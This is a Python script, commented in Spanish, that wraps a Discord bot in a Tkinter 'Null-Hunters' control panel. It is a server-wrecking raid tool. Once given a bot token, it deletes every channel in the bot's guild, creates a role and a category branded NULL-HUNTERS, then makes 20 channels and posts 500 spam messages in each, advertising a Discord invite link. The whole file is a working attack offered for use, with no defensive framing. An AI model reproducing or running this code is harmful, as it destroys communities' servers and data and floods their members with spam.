import tkinter as tk
from tkinter import messagebox
import discord
from discord.ext import commands, tasks
from PIL import Image, ImageTk  # Necesario para trabajar con imágenes en Tkinter

# Crear la ventana principal
root = tk.Tk()
root.title("Null-Hunters Bot Control Panel")

# Configuración de la ventana
root.geometry("600x400")  # Tamaño de la ventana

# Cargar la imagen de fondo
bg_image = Image.open("fondo.png")  # Asegúrate de que el archivo se llame "fondo.png" o el nombre correcto
bg_image = bg_image.resize((600, 400), Image.ANTIALIAS)  # Redimensionar la imagen para que se ajuste
bg_photo = ImageTk.PhotoImage(bg_image)

# Crear un label para la imagen de fondo
bg_label = tk.Label(root, image=bg_photo)
bg_label.place(relwidth=1, relheight=1)  # Esto hace que la imagen ocupe todo el fondo

# Función para iniciar sesión con el token
def start_bot():
    token = entry_token.get()
    bot_id = entry_bot_id.get()

    if not token or not bot_id:
        messagebox.showerror("Error", "Ambos campos son requeridos")
        return

    # Conectar al bot de Discord usando discord.py
    client = commands.Bot(command_prefix="!")

    @client.event
    async def on_ready():
        print(f'Bot conectado como {client.user}')
        messagebox.showinfo("Conexión exitosa", f'Conectado como {client.user}')

        # Obtener el servidor donde el bot está presente
        guild = client.guilds[0]  # Asumiendo que el bot está en solo un servidor
        invite_link = "https://discord.gg/Rfs9N3fya4"
        
        # Borrar todos los canales existentes
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Canal {channel.name} borrado.")
            except discord.Forbidden:
                print(f"No tengo permisos para borrar el canal {channel.name}")
        
        # Crear el rol con fuente rara
        role_name = "𝙽̷𝚄̷𝙻̷𝙻̷-𝙷̷𝚄̷𝙽̷𝚃̷𝙴̷𝚁̷𝚂̷"
        role = await guild.create_role(name=role_name, color=discord.Color.green())

        # Crear la categoría
        category = await guild.create_category("NULL-HUNTERS IS HERE")

        # Crear hasta 20 canales y mandar mensajes
        for i in range(1, 21):  # Crear hasta 20 canales
            channel = await guild.create_text_channel(f"null-hunters-channel-{i}", category=category)
            # Enviar 500 mensajes en cada canal
            for _ in range(500):  # Enviar hasta 500 mensajes en cada canal
                await channel.send(f"{invite_link} 𝙽̷𝚄̷𝙻̷𝙻̷-𝙷̷𝚄̷𝙽̷𝚃̷𝙴̷𝚁̷𝚂̷ 𝙸̷𝚂̷ 𝙸̷𝙽̷ 𝚈̷𝙾̷𝚄̷𝚁̷ 𝚂̷𝙴̷𝚁̷𝚅̷𝙴̷𝚁̷")

        print("Canales creados y mensajes enviados.")

    try:
        client.run(token)
    except discord.LoginFailure:
        messagebox.showerror("Error", "Token inválido o fallo en la conexión")

# Crear campos de entrada
tk.Label(root, text="Bot Token", bg='white').pack(pady=5)
entry_token = tk.Entry(root, width=30)
entry_token.pack(pady=5)

tk.Label(root, text="Bot ID", bg='white').pack(pady=5)
entry_bot_id = tk.Entry(root, width=30)
entry_bot_id.pack(pady=5)

# Botón para iniciar sesión
button_start = tk.Button(root, text="Iniciar Bot", command=start_bot)
button_start.pack(pady=20)

# Texto "Creado por NULL-HUNTERS" en la parte inferior
footer_label = tk.Label(root, text="Creado por NULL-HUNTERS", bg='black', fg='white', font=('Arial', 10))
footer_label.place(relx=0.5, rely=0.95, anchor='center')  # Posiciona el texto en la parte inferior centrado

# Ejecutar la ventana
root.mainloop()